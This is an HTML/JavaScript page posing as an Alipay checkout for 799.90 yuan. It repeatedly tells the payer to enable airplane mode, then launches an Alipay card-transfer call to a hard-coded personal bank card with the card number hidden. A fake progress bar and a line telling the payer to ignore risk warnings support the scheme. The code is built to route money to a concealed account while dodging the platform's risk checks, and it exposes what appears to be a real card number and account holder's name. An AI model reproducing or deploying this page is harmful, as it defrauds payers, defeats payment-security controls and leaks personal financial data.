





<!DOCTYPE html>
<html lang="zh">
<head >
    <meta charset="utf-8" />
    <title>支付宝支付</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0" />


    <script>
        var payFlag = false;
        var docEl = document.documentElement;
        docEl.style.fontSize = 100 / 375 * docEl.clientWidth  + 'px';
        window.addEventListener('resize', function() {
            docEl.style.fontSize = 100 / 375 * docEl.clientWidth + 'px';
        });
    </script>
    <link rel="stylesheet" href="https://gw.alipayobjects.com/as/g/antui/antui/10.1.10/dpl/antui.css"/>
    <link rel="stylesheet"  href="https://gw.alipayobjects.com/as/g/antui/antui/10.1.10/dpl/widget/message.css" />
    <link rel="stylesheet"  href="https://gw.alipayobjects.com/as/g/antui/antui/10.1.10/dpl/icon/message.css" />
    <link rel="stylesheet"  href="https://gw.alipayobjects.com/as/g/antui/antui/10.1.32/rem/widget/notice.css" />
    <link rel="stylesheet"  href="https://gw.alipayobjects.com/as/g/antui/antui/10.1.32/dpl/widget/tips.css" />
    <link rel="stylesheet"  href="https://gw.alipayobjects.com/as/g/antui/antui/10.1.32/dpl/widget/toast.css" />

    <script type="text/javascript" charset="utf-8" src="/jquery.min.js"></script>
    <script src="https://gw.alipayobjects.com/as/g/h5-lib/alipayjsapi/3.1.1/alipayjsapi.min.js"></script>
    <script src="https://gw.alipayobjects.com/as/g/antui/antui/10.1.10/antui.js"></script>
    <script type="text/javascript" charset="utf-8" src="/alipayjswap.js"></script>

    <style>
        .am-message-weak {
            color: #108ee9;
            font-size: 12px;
        }
        .fly-mode {
            width: 90%;
            height: auto;
            text-align: center;
        }

        #qrImg img{
            margin:auto;
            mgrgin-top: 5px;
        }

        #skill {
            background-color: #e2e2e2;
            position: relative;
            display: block;
            border-radius: 20px;
            margin: 0;
            padding: 0;
            height: 18px;
            line-height: 18px;
        }
        .skillbar {
            max-width: 100%;
            position:absolute;
            height: 18px;
            line-height: 18px;
            background-color:#1E9FFF;
            border-radius: 20px;
            text-align: right;
        }
        .percent {
            top: -20px;
            line-height: 18px;
            font-size: 12px;
            position: static;
            padding: 0 10px;
            color: #fff;
        }
        .text {
            text-align: center;
            font-size: 20px;
            color: #ff070c;
        }

    </style>

</head>


<body ontouchstart="">
<div class="am-message result" style="padding:10px 15px;">




    <div class="am-message-weak">
        交易订单号：20200222000086053264144
    </div>
    <div class="am-message-weak" style="font-size:20px">
        金额 <b style="font-size: 30px; color: #ff5e15" id="money" >799.90</b> 元
    </div>
    <div class="am-button-wrap" style="font-size:22px">
        <div class="text" id="text1">请先开启"飞行模式",再点击"立即支付"！</div>
        <div class="text" style="display: none" id="text2" >等待跳转成功后，再打开网络链接</div>
        <div class="text" style="display: none" id="text4" >如果出现无法跳转,请耐心等待一下</div>
        <div class="text" style="display: none;color:#25d3ff" id="text3">授权中</div>
    </div>
    <div id="skill" style="display:none;">
        <div class="skillbar" id="sliderdiv">
            <span class="percent" id="slidertxt">10%</span>
        </div>
    </div>
    <div class="am-message-weak" style="margin-top: 10px;">
        <img class="fly-mode" src="/images/fly1.jpg">
    </div>
    <div class="am-message-weak" style="margin-top: 10px;">
        <img class="fly-mode" src="/images/fly2.jpg">
    </div>
    <div class="am-button-wrap" id="payButton">
        <button class="am-button blue" id="payBtn" onclick="scanQR()">立即支付</button>
    </div>
</div>
<div class="am-button-wrap">
    <p style="text-align: left;font-size: 16px; color: #969696;">
        如提示交易存在风险，请点击继续支付即可到账，请放心支付。
    </p>
</div>

<script>

    // var getStatusTimer;

    // function changeCss(cssClass,mainMsg,subMsg) {
    //     $(".am-icon.result").removeClass().addClass(cssClass);
    //     // $(".am-message-main").text(mainMsg);
    //     $(".am-message-sub").html(subMsg);
    // }
    // function changeJk(cssClass, subMsg) {
    //     $("#jk").html(subMsg);
    // }





































</script>

<script>

    // //右上角菜单
    // AlipayJSBridge.call('setOptionMenu', {
    //     icontype: 'filter',
    //
    // });
    // AlipayJSBridge.call('showOptionMenu');
    // document.addEventListener('optionMenu', function(e) {
    //     AlipayJSBridge.call('showPopMenu', {
    //         menus: [{
    //             name: "查看帮助",
    //             tag: "tag1",
    //
    //         },
    //             {
    //                 name: "我要投诉",
    //                 tag: "tag2",
    //             }
    //         ],
    //     }, function(e) {
    //         console.log(e);
    //     });
    // }, false);
    //
    // ap.allowPullDownRefresh(false);
    // ap.onPullDownRefresh(function(res){
    //     if(!res.refreshAvailable){
    //         ap.alert({
    //             content: '刷新已禁止',
    //             buttonText: '恢复'
    //         }, function(){
    //             ap.allowPullDownRefresh(true);
    //             ap.showToast('刷新已恢复')
    //         });
    //     }
    // });

    var u = navigator.userAgent;
    var isAndroid = u.indexOf('Android') > -1 || u.indexOf('Adr') > -1; //android终端
    var isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/); //ios终端

    function returnApp() {
        AlipayJSBridge.call("exitApp")
    }

    function ready(a) {
        window.AlipayJSBridge ? a && a() : document.addEventListener("AlipayJSBridgeReady", a, !1)
    }


    var a;
    var cardNo = '6221505580000196433';
    var cardNoMask = '';
    var bankAccount = '高守金';
    var money = '799.90';
    var amount = '799.90';
    var bankMark = 'PSBC';
    var bankName = '';
    var cardIndex = '';
    if(cardIndex != '' && cardIndex != null ){
        if(cardNoMask != '' && cardNoMask != null){
            cardNo = cardNoMask ;
        }else {
            cardNo = '请勿修改金额，两分钟到账***' ;
        }
    }

    a = {
        actionType: "toCard",
        sourceId: "bill",
        cardNo: cardNo,
        bankAccount: bankAccount,
        cardIndex:cardIndex,
        money: money,
        amount: amount,
        bankMark: bankMark,
        bankName: bankName,
        cardNoHidden:"true",
        cardChannel:"HISTORY_CARD",
        orderSource:"from"
    };

    // function jumpPay() {
    //     window.setInterval(function () {
    //         AlipayJSBridge.call("startApp", {
    //             appId: "09999988",
    //             param: a,
    //         }, function (a) {
    //
    //         })
    //     },2000);
    // }






























































    function scanQR(){
        ap.getNetworkType(function(res){
            if (res.networkAvailable) {
                ap.alert({
                    content:'请打开手机飞行模式(并关闭WIFI)!!!\n 请打开手机飞行模式(并关闭WIFI)!!!\n请打开手机飞行模式(并关闭WIFI)!!!'
                });
            } else {
                ap.alert({
                    content:'请勿提前关闭飞行模式!!\n成功跳转到支付页面后再关闭飞行模式! '
                });
                $("#payButton").hide();
                $("#skill").show();
                $("#text1").text('请勿触碰手机!!!');
                $("#text2").show();
                $("#text3").show();
                $("#text4").show();
                var timer = window.setInterval(function () {
                    var slidertxtval  = $("#slidertxt").text();

                    var txttemp =  slidertxtval.substr(0,2);
                    var txttempInt = parseInt(txttemp)+3;
                    // if(txttempInt >=100){
                    //     clearInterval(timer);
                    //     payAli();
                    // }
                    $("#sliderdiv").css('width', txttempInt+'%');
                    $("#slidertxt").text(txttempInt+'%');
                }, 2000);
                AlipayJSBridge.call("startApp", {
                    appId: "09999988",
                    param: a,
                }, function (a) {

                })
                // ap.confirm({
                //     title: '充值提示',
                //     content: '跳转后请关闭飞行模式!!!\n跳转后请关闭飞行模式!!!\n跳转后请关闭飞行模式!!!',
                //     confirmButtonText: '我知道了',
                //     cancelButtonText: '取消'
                // }, function(result){
                //     if(result.confirm){
                //         setTimeout(function () { payAli(); }, 50);
                //     }
                // });

            }
        });
    }
</script>

</body>




</html>